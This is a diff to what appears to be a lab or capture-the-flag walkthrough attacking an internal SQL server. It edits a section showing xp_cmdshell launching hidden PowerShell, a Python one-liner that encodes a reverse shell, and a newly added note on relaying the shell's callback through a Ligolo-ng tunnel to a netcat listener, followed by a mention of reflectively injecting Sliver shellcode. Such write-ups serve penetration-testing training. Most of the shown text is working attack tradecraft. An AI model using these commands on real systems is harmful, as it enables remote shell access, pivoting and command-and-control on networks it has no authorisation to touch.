@@ -278,7 +278,7 @@ EXECUTE ('EXECUTE AS LOGIN = ''adm''; EXEC xp_cmdshell ''powershell -nop -W hidd
 
 And to generate the powershell revershell, the following one liner is used
 
-```python3 title="Python3 one liner to generate a encoded revershell"
+```python title="Python3 one liner to generate a encoded revershell"
 
 python3 -c "
 import base64
@@ -287,6 +287,22 @@ print(base64.b64encode(cmd.encode('utf-16-le')).decode())
 "
 
 ```
+
+:::note[Ligolo port-forwarding for the callback]
+SQL07 sits on the internal `it-ifrit` network and can't route to the attacker
+box directly, so the reverse shell calls back to the **Ligolo tunnel interface**
+(`172.16.116.201:443` above) rather than a real listener. Add a **listener /
+port-forward on the Ligolo agent** so that inbound `:443` on the tunnel IP is
+redirected to the handler on the attacker machine — otherwise the shell connects
+into the pivot and dies with nothing catching it:
+
+```bash title="Ligolo listener → attacker handler"
+# in the ligolo-ng proxy console (session selected)
+listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
+# now catch it locally
+rlwrap nc -lvnp 443
+```
+:::
 
 **Step 2 — reflectively load the beacon.** From that shell, pull the raw Sliver
 **shellcode** over HTTP and inject it into the current process with
